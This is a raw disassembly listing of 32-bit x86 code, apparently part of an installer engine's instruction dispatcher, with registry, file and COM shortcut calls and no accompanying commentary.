  401e08:	53                   	push   %ebx
  401e09:	e8 b1 0d 00 00       	call   0x402bbf
  401e0e:	6a 31                	push   $0x31
  401e10:	8b f0                	mov    %eax,%esi
  401e12:	e8 a8 0d 00 00       	call   0x402bbf
  401e17:	6a 22                	push   $0x22
  401e19:	8b d8                	mov    %eax,%ebx
  401e1b:	e8 9f 0d 00 00       	call   0x402bbf
  401e20:	6a 15                	push   $0x15
  401e22:	8b f8                	mov    %eax,%edi
  401e24:	e8 96 0d 00 00       	call   0x402bbf
  401e29:	6a ec                	push   $0xffffffec
  401e2b:	e8 f3 f5 ff ff       	call   0x401423
  401e30:	66 8b 07             	mov    (%edi),%ax
  401e33:	ff 75 e0             	push   -0x20(%ebp)
  401e36:	66 f7 d8             	neg    %ax
  401e39:	1b c0                	sbb    %eax,%eax
  401e3b:	68 00 50 43 00       	push   $0x435000
  401e40:	23 c7                	and    %edi,%eax
  401e42:	50                   	push   %eax
  401e43:	66 8b 06             	mov    (%esi),%ax
  401e46:	66 f7 d8             	neg    %ax
  401e49:	1b c0                	sbb    %eax,%eax
  401e4b:	53                   	push   %ebx
  401e4c:	23 c6                	and    %esi,%eax
  401e4e:	50                   	push   %eax
  401e4f:	ff 75 f4             	push   -0xc(%ebp)
  401e52:	ff 15 8c 71 40 00    	call   *0x40718c
  401e58:	83 f8 21             	cmp    $0x21,%eax
  401e5b:	0f 8d eb 0b 00 00    	jge    0x402a4c
  401e61:	e9 b8 09 00 00       	jmp    0x40281e
  401e66:	53                   	push   %ebx
  401e67:	e8 53 0d 00 00       	call   0x402bbf
  401e6c:	8b f0                	mov    %eax,%esi
  401e6e:	56                   	push   %esi
  401e6f:	6a eb                	push   $0xffffffeb
  401e71:	e8 03 33 00 00       	call   0x405179
  401e76:	56                   	push   %esi
  401e77:	e8 7e 38 00 00       	call   0x4056fa
  401e7c:	3b c3                	cmp    %ebx,%eax
  401e7e:	89 45 08             	mov    %eax,0x8(%ebp)
  401e81:	0f 84 97 09 00 00    	je     0x40281e
  401e87:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401e8a:	74 4f                	je     0x401edb
  401e8c:	8b 35 b8 70 40 00    	mov    0x4070b8,%esi
  401e92:	6a 64                	push   $0x64
  401e94:	50                   	push   %eax
  401e95:	ff d6                	call   *%esi
  401e97:	bf 02 01 00 00       	mov    $0x102,%edi
  401e9c:	eb 0e                	jmp    0x401eac
  401e9e:	6a 0f                	push   $0xf
  401ea0:	e8 8b 45 00 00       	call   0x406430
  401ea5:	6a 64                	push   $0x64
  401ea7:	ff 75 08             	push   0x8(%ebp)
  401eaa:	ff d6                	call   *%esi
  401eac:	3b c7                	cmp    %edi,%eax
  401eae:	74 ee                	je     0x401e9e
  401eb0:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401eb3:	50                   	push   %eax
  401eb4:	ff 75 08             	push   0x8(%ebp)
  401eb7:	ff 15 38 71 40 00    	call   *0x407138
  401ebd:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401ec0:	7c 0d                	jl     0x401ecf
  401ec2:	ff 75 f8             	push   -0x8(%ebp)
  401ec5:	ff 75 f0             	push   -0x10(%ebp)
  401ec8:	e8 94 40 00 00       	call   0x405f61
  401ecd:	eb 0c                	jmp    0x401edb
  401ecf:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  401ed2:	74 07                	je     0x401edb
  401ed4:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401edb:	ff 75 08             	push   0x8(%ebp)
  401ede:	ff 15 20 71 40 00    	call   *0x407120
  401ee4:	e9 63 0b 00 00       	jmp    0x402a4c
  401ee9:	6a 02                	push   $0x2
  401eeb:	e8 cf 0c 00 00       	call   0x402bbf
  401ef0:	50                   	push   %eax
  401ef1:	e8 67 44 00 00       	call   0x40635d
  401ef6:	8b f8                	mov    %eax,%edi
  401ef8:	3b fb                	cmp    %ebx,%edi
  401efa:	74 13                	je     0x401f0f
  401efc:	ff 77 14             	push   0x14(%edi)
  401eff:	ff 75 f0             	push   -0x10(%ebp)
  401f02:	e8 5a 40 00 00       	call   0x405f61
  401f07:	ff 77 18             	push   0x18(%edi)
  401f0a:	e9 56 f6 ff ff       	jmp    0x401565
  401f0f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401f12:	66 89 1e             	mov    %bx,(%esi)
  401f15:	66 89 18             	mov    %bx,(%eax)
  401f18:	e9 01 09 00 00       	jmp    0x40281e
  401f1d:	6a ee                	push   $0xffffffee
  401f1f:	e8 9b 0c 00 00       	call   0x402bbf
  401f24:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  401f27:	89 45 b8             	mov    %eax,-0x48(%ebp)
  401f2a:	51                   	push   %ecx
  401f2b:	50                   	push   %eax
  401f2c:	6a 08                	push   $0x8
  401f2e:	e8 c1 44 00 00       	call   0x4063f4
  401f33:	ff d0                	call   *%eax
  401f35:	8b f8                	mov    %eax,%edi
  401f37:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401f3a:	66 89 1e             	mov    %bx,(%esi)
  401f3d:	3b fb                	cmp    %ebx,%edi
  401f3f:	66 89 18             	mov    %bx,(%eax)
  401f42:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401f49:	0f 84 fd 0a 00 00    	je     0x402a4c
  401f4f:	57                   	push   %edi
  401f50:	6a 40                	push   $0x40
  401f52:	ff 15 0c 71 40 00    	call   *0x40710c
  401f58:	3b c3                	cmp    %ebx,%eax
  401f5a:	89 45 08             	mov    %eax,0x8(%ebp)
  401f5d:	0f 84 e9 0a 00 00    	je     0x402a4c
  401f63:	6a 09                	push   $0x9
  401f65:	e8 8a 44 00 00       	call   0x4063f4
  401f6a:	6a 0a                	push   $0xa
  401f6c:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401f6f:	e8 80 44 00 00       	call   0x4063f4
  401f74:	ff 75 08             	push   0x8(%ebp)
  401f77:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401f7a:	57                   	push   %edi
  401f7b:	53                   	push   %ebx
  401f7c:	ff 75 b8             	push   -0x48(%ebp)
  401f7f:	ff 55 c8             	call   *-0x38(%ebp)
  401f82:	85 c0                	test   %eax,%eax
  401f84:	74 34                	je     0x401fba
  401f86:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  401f89:	50                   	push   %eax
  401f8a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401f8d:	50                   	push   %eax
  401f8e:	68 14 90 40 00       	push   $0x409014
  401f93:	ff 75 08             	push   0x8(%ebp)
  401f96:	ff 55 ec             	call   *-0x14(%ebp)
  401f99:	85 c0                	test   %eax,%eax
  401f9b:	74 1d                	je     0x401fba
  401f9d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401fa0:	ff 70 08             	push   0x8(%eax)
  401fa3:	56                   	push   %esi
  401fa4:	e8 b8 3f 00 00       	call   0x405f61
  401fa9:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401fac:	ff 70 0c             	push   0xc(%eax)
  401faf:	ff 75 f0             	push   -0x10(%ebp)
  401fb2:	e8 aa 3f 00 00       	call   0x405f61
  401fb7:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401fba:	ff 75 08             	push   0x8(%ebp)
  401fbd:	e9 e5 fb ff ff       	jmp    0x401ba7
  401fc2:	39 1d b8 92 42 00    	cmp    %ebx,0x4292b8
  401fc8:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401fcf:	0f 8c b9 00 00 00    	jl     0x40208e
  401fd5:	6a f0                	push   $0xfffffff0
  401fd7:	e8 e3 0b 00 00       	call   0x402bbf
  401fdc:	6a 01                	push   $0x1
  401fde:	8b f0                	mov    %eax,%esi
  401fe0:	e8 da 0b 00 00       	call   0x402bbf
  401fe5:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401fe8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401feb:	74 0e                	je     0x401ffb
  401fed:	56                   	push   %esi
  401fee:	ff 15 74 71 40 00    	call   *0x407174
  401ff4:	3b c3                	cmp    %ebx,%eax
  401ff6:	89 45 08             	mov    %eax,0x8(%ebp)
  401ff9:	75 11                	jne    0x40200c
  401ffb:	6a 08                	push   $0x8
  401ffd:	53                   	push   %ebx
  401ffe:	56                   	push   %esi
  401fff:	ff 15 70 71 40 00    	call   *0x407170
  402005:	3b c3                	cmp    %ebx,%eax
  402007:	89 45 08             	mov    %eax,0x8(%ebp)
  40200a:	74 7b                	je     0x402087
  40200c:	ff 75 f8             	push   -0x8(%ebp)
  40200f:	ff 75 08             	push   0x8(%ebp)
  402012:	e8 4c 44 00 00       	call   0x406463
  402017:	8b f0                	mov    %eax,%esi
  402019:	3b f3                	cmp    %ebx,%esi
  40201b:	74 39                	je     0x402056
  40201d:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402020:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402023:	74 17                	je     0x40203c
  402025:	ff 75 dc             	push   -0x24(%ebp)
  402028:	e8 f6 f3 ff ff       	call   0x401423
  40202d:	ff d6                	call   *%esi
  40202f:	85 c0                	test   %eax,%eax
  402031:	74 2d                	je     0x402060
  402033:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40203a:	eb 24                	jmp    0x402060
  40203c:	68 00 90 40 00       	push   $0x409000
  402041:	68 ac bd 40 00       	push   $0x40bdac
  402046:	57                   	push   %edi
  402047:	68 00 04 00 00       	push   $0x400
  40204c:	ff 75 f4             	push   -0xc(%ebp)
  40204f:	ff d6                	call   *%esi
  402051:	83 c4 14             	add    $0x14,%esp
  402054:	eb 0a                	jmp    0x402060
  402056:	ff 75 f8             	push   -0x8(%ebp)
  402059:	6a f7                	push   $0xfffffff7
  40205b:	e8 19 31 00 00       	call   0x405179
  402060:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402063:	0f 85 e3 09 00 00    	jne    0x402a4c
  402069:	ff 75 08             	push   0x8(%ebp)
  40206c:	e8 92 17 00 00       	call   0x403803
  402071:	85 c0                	test   %eax,%eax
  402073:	0f 84 d3 09 00 00    	je     0x402a4c
  402079:	ff 75 08             	push   0x8(%ebp)
  40207c:	ff 15 6c 71 40 00    	call   *0x40716c
  402082:	e9 c5 09 00 00       	jmp    0x402a4c
  402087:	6a f6                	push   $0xfffffff6
  402089:	e9 4e 01 00 00       	jmp    0x4021dc
  40208e:	6a e7                	push   $0xffffffe7
  402090:	e9 47 01 00 00       	jmp    0x4021dc
  402095:	6a f0                	push   $0xfffffff0
  402097:	e8 23 0b 00 00       	call   0x402bbf
  40209c:	6a df                	push   $0xffffffdf
  40209e:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4020a1:	e8 19 0b 00 00       	call   0x402bbf
  4020a6:	6a 02                	push   $0x2
  4020a8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4020ab:	e8 0f 0b 00 00       	call   0x402bbf
  4020b0:	6a cd                	push   $0xffffffcd
  4020b2:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4020b5:	e8 05 0b 00 00       	call   0x402bbf
  4020ba:	6a 45                	push   $0x45
  4020bc:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4020bf:	e8 fb 0a 00 00       	call   0x402bbf
  4020c4:	ff 75 f8             	push   -0x8(%ebp)
  4020c7:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4020ca:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4020cd:	8b c8                	mov    %eax,%ecx
  4020cf:	8b f8                	mov    %eax,%edi
  4020d1:	8b f0                	mov    %eax,%esi
  4020d3:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  4020d9:	c1 f8 10             	sar    $0x10,%eax
  4020dc:	c1 fe 0c             	sar    $0xc,%esi
  4020df:	25 ff ff 00 00       	and    $0xffff,%eax
  4020e4:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  4020e7:	81 e7 00 80 00 00    	and    $0x8000,%edi
  4020ed:	83 e6 07             	and    $0x7,%esi
  4020f0:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4020f3:	e8 4d 39 00 00       	call   0x405a45
  4020f8:	85 c0                	test   %eax,%eax
  4020fa:	75 07                	jne    0x402103
  4020fc:	6a 21                	push   $0x21
  4020fe:	e8 bc 0a 00 00       	call   0x402bbf
  402103:	8d 45 08             	lea    0x8(%ebp),%eax
  402106:	50                   	push   %eax
  402107:	68 d4 74 40 00       	push   $0x4074d4
  40210c:	6a 01                	push   $0x1
  40210e:	53                   	push   %ebx
  40210f:	68 e4 74 40 00       	push   $0x4074e4
  402114:	ff 15 ac 72 40 00    	call   *0x4072ac
  40211a:	3b c3                	cmp    %ebx,%eax
  40211c:	0f 8c b1 00 00 00    	jl     0x4021d3
  402122:	8b 45 08             	mov    0x8(%ebp),%eax
  402125:	8d 55 b8             	lea    -0x48(%ebp),%edx
  402128:	52                   	push   %edx
  402129:	68 f4 74 40 00       	push   $0x4074f4
  40212e:	8b 08                	mov    (%eax),%ecx
  402130:	50                   	push   %eax
  402131:	ff 11                	call   *(%ecx)
  402133:	3b c3                	cmp    %ebx,%eax
  402135:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402138:	0f 8c 87 00 00 00    	jl     0x4021c5
  40213e:	8b 45 08             	mov    0x8(%ebp),%eax
  402141:	ff 75 f8             	push   -0x8(%ebp)
  402144:	8b 08                	mov    (%eax),%ecx
  402146:	50                   	push   %eax
  402147:	ff 51 50             	call   *0x50(%ecx)
  40214a:	3b fb                	cmp    %ebx,%edi
  40214c:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40214f:	75 0e                	jne    0x40215f
  402151:	8b 45 08             	mov    0x8(%ebp),%eax
  402154:	68 00 50 43 00       	push   $0x435000
  402159:	50                   	push   %eax
  40215a:	8b 08                	mov    (%eax),%ecx
  40215c:	ff 51 24             	call   *0x24(%ecx)
  40215f:	3b f3                	cmp    %ebx,%esi
  402161:	74 0a                	je     0x40216d
  402163:	8b 45 08             	mov    0x8(%ebp),%eax
  402166:	56                   	push   %esi
  402167:	50                   	push   %eax
  402168:	8b 08                	mov    (%eax),%ecx
  40216a:	ff 51 3c             	call   *0x3c(%ecx)
  40216d:	8b 45 08             	mov    0x8(%ebp),%eax
  402170:	ff 75 c8             	push   -0x38(%ebp)
  402173:	8b 08                	mov    (%eax),%ecx
  402175:	50                   	push   %eax
  402176:	ff 51 34             	call   *0x34(%ecx)
  402179:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  40217c:	66 39 19             	cmp    %bx,(%ecx)
  40217f:	74 0d                	je     0x40218e
  402181:	8b 45 08             	mov    0x8(%ebp),%eax
  402184:	ff 75 c0             	push   -0x40(%ebp)
  402187:	8b 10                	mov    (%eax),%edx
  402189:	51                   	push   %ecx
  40218a:	50                   	push   %eax
  40218b:	ff 52 44             	call   *0x44(%edx)
  40218e:	8b 45 08             	mov    0x8(%ebp),%eax
  402191:	ff 75 f4             	push   -0xc(%ebp)
  402194:	8b 08                	mov    (%eax),%ecx
  402196:	50                   	push   %eax
  402197:	ff 51 2c             	call   *0x2c(%ecx)
  40219a:	8b 45 08             	mov    0x8(%ebp),%eax
  40219d:	ff 75 f0             	push   -0x10(%ebp)
  4021a0:	8b 08                	mov    (%eax),%ecx
  4021a2:	50                   	push   %eax
  4021a3:	ff 51 1c             	call   *0x1c(%ecx)
  4021a6:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  4021a9:	7c 11                	jl     0x4021bc
  4021ab:	8b 45 b8             	mov    -0x48(%ebp),%eax
  4021ae:	6a 01                	push   $0x1
  4021b0:	ff 75 cc             	push   -0x34(%ebp)
  4021b3:	8b 08                	mov    (%eax),%ecx
  4021b5:	50                   	push   %eax
  4021b6:	ff 51 18             	call   *0x18(%ecx)
  4021b9:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4021bc:	8b 45 b8             	mov    -0x48(%ebp),%eax
  4021bf:	50                   	push   %eax
  4021c0:	8b 08                	mov    (%eax),%ecx
  4021c2:	ff 51 08             	call   *0x8(%ecx)
  4021c5:	8b 45 08             	mov    0x8(%ebp),%eax
  4021c8:	50                   	push   %eax
  4021c9:	8b 08                	mov    (%eax),%ecx
  4021cb:	ff 51 08             	call   *0x8(%ecx)
  4021ce:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  4021d1:	7d 13                	jge    0x4021e6
  4021d3:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4021da:	6a f0                	push   $0xfffffff0
  4021dc:	e8 42 f2 ff ff       	call   0x401423
  4021e1:	e9 66 08 00 00       	jmp    0x402a4c
  4021e6:	6a f4                	push   $0xfffffff4
  4021e8:	eb f2                	jmp    0x4021dc
  4021ea:	53                   	push   %ebx
  4021eb:	e8 cf 09 00 00       	call   0x402bbf
  4021f0:	6a 11                	push   $0x11
  4021f2:	8b f0                	mov    %eax,%esi
  4021f4:	e8 c6 09 00 00       	call   0x402bbf
  4021f9:	6a 23                	push   $0x23
  4021fb:	8b f8                	mov    %eax,%edi
  4021fd:	e8 bd 09 00 00       	call   0x402bbf
  402202:	56                   	push   %esi
  402203:	89 45 08             	mov    %eax,0x8(%ebp)
  402206:	e8 52 41 00 00       	call   0x40635d
  40220b:	85 c0                	test   %eax,%eax
  40220d:	75 0d                	jne    0x40221c
  40220f:	53                   	push   %ebx
  402210:	6a f9                	push   $0xfffffff9
  402212:	e8 62 2f 00 00       	call   0x405179
  402217:	e9 02 06 00 00       	jmp    0x40281e
  40221c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40221f:	56                   	push   %esi
  402220:	89 45 a0             	mov    %eax,-0x60(%ebp)
  402223:	c7 45 a4 02 00 00 00 	movl   $0x2,-0x5c(%ebp)
  40222a:	e8 01 3e 00 00       	call   0x406030
  40222f:	57                   	push   %edi
  402230:	66 89 5c 46 02       	mov    %bx,0x2(%esi,%eax,2)
  402235:	e8 f6 3d 00 00       	call   0x406030
  40223a:	66 89 5c 47 02       	mov    %bx,0x2(%edi,%eax,2)
  40223f:	8b 45 08             	mov    0x8(%ebp),%eax
  402242:	66 8b 4d dc          	mov    -0x24(%ebp),%cx
  402246:	50                   	push   %eax
  402247:	53                   	push   %ebx
  402248:	89 75 a8             	mov    %esi,-0x58(%ebp)
  40224b:	89 7d ac             	mov    %edi,-0x54(%ebp)
  40224e:	89 45 ba             	mov    %eax,-0x46(%ebp)
  402251:	66 89 4d b0          	mov    %cx,-0x50(%ebp)
  402255:	e8 1f 2f 00 00       	call   0x405179
  40225a:	8d 45 a0             	lea    -0x60(%ebp),%eax
  40225d:	50                   	push   %eax
  40225e:	ff 15 90 71 40 00    	call   *0x407190
  402264:	85 c0                	test   %eax,%eax
  402266:	0f 84 e0 07 00 00    	je     0x402a4c
  40226c:	eb a1                	jmp    0x40220f
  40226e:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  402273:	74 1d                	je     0x402292
  402275:	68 10 00 20 00       	push   $0x200010
  40227a:	6a e8                	push   $0xffffffe8
  40227c:	53                   	push   %ebx
  40227d:	e8 ba 3d 00 00       	call   0x40603c
  402282:	50                   	push   %eax
  402283:	e8 d7 34 00 00       	call   0x40575f
  402288:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  40228d:	e9 c5 07 00 00       	jmp    0x402a57
  402292:	ff 05 94 92 42 00    	incl   0x429294
  402298:	e9 af 07 00 00       	jmp    0x402a4c
  40229d:	33 f6                	xor    %esi,%esi
  40229f:	33 ff                	xor    %edi,%edi
  4022a1:	3b c3                	cmp    %ebx,%eax
  4022a3:	74 08                	je     0x4022ad
  4022a5:	53                   	push   %ebx
  4022a6:	e8 14 09 00 00       	call   0x402bbf
  4022ab:	8b f0                	mov    %eax,%esi
  4022ad:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  4022b0:	74 09                	je     0x4022bb
  4022b2:	6a 11                	push   $0x11
  4022b4:	e8 06 09 00 00       	call   0x402bbf
  4022b9:	8b f8                	mov    %eax,%edi
  4022bb:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4022be:	74 09                	je     0x4022c9
  4022c0:	6a 22                	push   $0x22
  4022c2:	e8 f8 08 00 00       	call   0x402bbf
  4022c7:	8b d8                	mov    %eax,%ebx
  4022c9:	6a cd                	push   $0xffffffcd
  4022cb:	e8 ef 08 00 00       	call   0x402bbf
  4022d0:	50                   	push   %eax
  4022d1:	53                   	push   %ebx
  4022d2:	57                   	push   %edi
  4022d3:	56                   	push   %esi
  4022d4:	ff 15 68 71 40 00    	call   *0x407168
  4022da:	e9 cd f2 ff ff       	jmp    0x4015ac
  4022df:	a1 10 90 40 00       	mov    0x409010,%eax
  4022e4:	6a 01                	push   $0x1
  4022e6:	89 45 08             	mov    %eax,0x8(%ebp)
  4022e9:	e8 d1 08 00 00       	call   0x402bbf
  4022ee:	6a 12                	push   $0x12
  4022f0:	8b f8                	mov    %eax,%edi
  4022f2:	e8 c8 08 00 00       	call   0x402bbf
  4022f7:	6a dd                	push   $0xffffffdd
  4022f9:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4022fc:	e8 be 08 00 00       	call   0x402bbf
  402301:	50                   	push   %eax
  402302:	68 ff 03 00 00       	push   $0x3ff
  402307:	8d 45 08             	lea    0x8(%ebp),%eax
  40230a:	56                   	push   %esi
  40230b:	50                   	push   %eax
  40230c:	ff 75 cc             	push   -0x34(%ebp)
  40230f:	57                   	push   %edi
  402310:	ff 15 64 71 40 00    	call   *0x407164
  402316:	66 83 3e 0a          	cmpw   $0xa,(%esi)
  40231a:	e9 2a f4 ff ff       	jmp    0x401749
  40231f:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  402322:	75 2b                	jne    0x40234f
  402324:	6a 02                	push   $0x2
  402326:	e8 9e 09 00 00       	call   0x402cc9
  40232b:	8b f0                	mov    %eax,%esi
  40232d:	3b f3                	cmp    %ebx,%esi
  40232f:	0f 84 e9 04 00 00    	je     0x40281e
  402335:	6a 33                	push   $0x33
  402337:	e8 83 08 00 00       	call   0x402bbf
  40233c:	50                   	push   %eax
  40233d:	56                   	push   %esi
  40233e:	ff 15 1c 70 40 00    	call   *0x40701c
  402344:	56                   	push   %esi
  402345:	8b f8                	mov    %eax,%edi
  402347:	ff 15 20 70 40 00    	call   *0x407020
  40234d:	eb 1f                	jmp    0x40236e
  40234f:	6a 22                	push   $0x22
  402351:	e8 69 08 00 00       	call   0x402bbf
  402356:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  402359:	83 e1 02             	and    $0x2,%ecx
  40235c:	51                   	push   %ecx
  40235d:	50                   	push   %eax
  40235e:	ff 75 d8             	push   -0x28(%ebp)
  402361:	e8 4e 09 00 00       	call   0x402cb4
  402366:	50                   	push   %eax
  402367:	e8 93 08 00 00       	call   0x402bff
  40236c:	8b f8                	mov    %eax,%edi
  40236e:	3b fb                	cmp    %ebx,%edi
  402370:	0f 84 d6 06 00 00    	je     0x402a4c
  402376:	e9 a3 04 00 00       	jmp    0x40281e
  40237b:	50                   	push   %eax
  40237c:	e8 33 09 00 00       	call   0x402cb4
  402381:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  402384:	8b f8                	mov    %eax,%edi
  402386:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402389:	6a 02                	push   $0x2
  40238b:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40238e:	e8 2c 08 00 00       	call   0x402bbf
  402393:	6a 11                	push   $0x11
  402395:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402398:	e8 22 08 00 00       	call   0x402bbf
  40239d:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4023a0:	53                   	push   %ebx
  4023a1:	51                   	push   %ecx
  4023a2:	8b 0d b0 92 42 00    	mov    0x4292b0,%ecx
  4023a8:	83 c9 02             	or     $0x2,%ecx
  4023ab:	53                   	push   %ebx
  4023ac:	51                   	push   %ecx
  4023ad:	53                   	push   %ebx
  4023ae:	53                   	push   %ebx
  4023af:	53                   	push   %ebx
  4023b0:	50                   	push   %eax
  4023b1:	57                   	push   %edi
  4023b2:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4023b9:	ff 15 24 70 40 00    	call   *0x407024
  4023bf:	85 c0                	test   %eax,%eax
  4023c1:	0f 85 85 06 00 00    	jne    0x402a4c
  4023c7:	83 fe 01             	cmp    $0x1,%esi
  4023ca:	bf a8 a5 40 00       	mov    $0x40a5a8,%edi
  4023cf:	75 11                	jne    0x4023e2
  4023d1:	6a 23                	push   $0x23
  4023d3:	e8 e7 07 00 00       	call   0x402bbf
  4023d8:	57                   	push   %edi
  4023d9:	e8 52 3c 00 00       	call   0x406030
  4023de:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  4023e2:	83 fe 04             	cmp    $0x4,%esi
  4023e5:	75 0e                	jne    0x4023f5
  4023e7:	6a 03                	push   $0x3
  4023e9:	e8 b4 07 00 00       	call   0x402ba2
  4023ee:	56                   	push   %esi
  4023ef:	a3 a8 a5 40 00       	mov    %eax,0x40a5a8
  4023f4:	58                   	pop    %eax
  4023f5:	83 fe 03             	cmp    $0x3,%esi
  4023f8:	75 0f                	jne    0x402409
  4023fa:	68 00 18 00 00       	push   $0x1800
  4023ff:	57                   	push   %edi
  402400:	53                   	push   %ebx
  402401:	ff 75 e0             	push   -0x20(%ebp)
  402404:	e8 1e 0c 00 00       	call   0x403027
  402409:	50                   	push   %eax
  40240a:	57                   	push   %edi
  40240b:	ff 75 cc             	push   -0x34(%ebp)
  40240e:	53                   	push   %ebx
  40240f:	ff 75 f8             	push   -0x8(%ebp)
  402412:	ff 75 08             	push   0x8(%ebp)
  402415:	ff 15 28 70 40 00    	call   *0x407028
  40241b:	85 c0                	test   %eax,%eax
  40241d:	75 03                	jne    0x402422
  40241f:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402422:	ff 75 08             	push   0x8(%ebp)
  402425:	e9 cc 00 00 00       	jmp    0x4024f6
  40242a:	68 19 00 02 00       	push   $0x20019
  40242f:	e8 95 08 00 00       	call   0x402cc9
  402434:	6a 33                	push   $0x33
  402436:	8b f8                	mov    %eax,%edi
  402438:	e8 82 07 00 00       	call   0x402bbf
  40243d:	3b fb                	cmp    %ebx,%edi
  40243f:	66 89 1e             	mov    %bx,(%esi)
  402442:	0f 84 d6 03 00 00    	je     0x40281e
  402448:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40244b:	c7 45 cc 00 08 00 00 	movl   $0x800,-0x34(%ebp)
  402452:	51                   	push   %ecx
  402453:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402456:	56                   	push   %esi
  402457:	51                   	push   %ecx
  402458:	53                   	push   %ebx
  402459:	50                   	push   %eax
  40245a:	57                   	push   %edi
  40245b:	ff 15 2c 70 40 00    	call   *0x40702c
  402461:	33 c9                	xor    %ecx,%ecx
  402463:	41                   	inc    %ecx
  402464:	85 c0                	test   %eax,%eax
  402466:	75 2e                	jne    0x402496
  402468:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  40246c:	74 13                	je     0x402481
  40246e:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  402471:	74 06                	je     0x402479
  402473:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  402477:	75 1d                	jne    0x402496
  402479:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40247c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40247f:	eb 6d                	jmp    0x4024ee
  402481:	ff 36                	push   (%esi)
  402483:	33 c0                	xor    %eax,%eax
  402485:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  402488:	56                   	push   %esi
  402489:	0f 94 c0             	sete   %al
  40248c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40248f:	e8 cd 3a 00 00       	call   0x405f61
  402494:	eb 5f                	jmp    0x4024f5
  402496:	66 89 1e             	mov    %bx,(%esi)
  402499:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40249c:	eb 57                	jmp    0x4024f5
  40249e:	68 19 00 02 00       	push   $0x20019
  4024a3:	e8 21 08 00 00       	call   0x402cc9
  4024a8:	6a 03                	push   $0x3
  4024aa:	8b f8                	mov    %eax,%edi
  4024ac:	e8 f1 06 00 00       	call   0x402ba2
  4024b1:	3b fb                	cmp    %ebx,%edi
  4024b3:	66 89 1e             	mov    %bx,(%esi)
  4024b6:	0f 84 62 03 00 00    	je     0x40281e
  4024bc:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4024bf:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  4024c4:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4024c7:	74 0c                	je     0x4024d5
  4024c9:	51                   	push   %ecx
  4024ca:	56                   	push   %esi
  4024cb:	50                   	push   %eax
  4024cc:	57                   	push   %edi
  4024cd:	ff 15 30 70 40 00    	call   *0x407030
  4024d3:	eb 19                	jmp    0x4024ee
  4024d5:	53                   	push   %ebx
  4024d6:	53                   	push   %ebx
  4024d7:	53                   	push   %ebx
  4024d8:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4024db:	53                   	push   %ebx
  4024dc:	51                   	push   %ecx
  4024dd:	56                   	push   %esi
  4024de:	50                   	push   %eax
  4024df:	57                   	push   %edi
  4024e0:	ff 15 18 70 40 00    	call   *0x407018
  4024e6:	85 c0                	test   %eax,%eax
  4024e8:	0f 85 30 03 00 00    	jne    0x40281e
  4024ee:	66 89 9e fe 07 00 00 	mov    %bx,0x7fe(%esi)
  4024f5:	57                   	push   %edi
  4024f6:	ff 15 20 70 40 00    	call   *0x407020
  4024fc:	e9 4b 05 00 00       	jmp    0x402a4c
  402501:	56                   	push   %esi
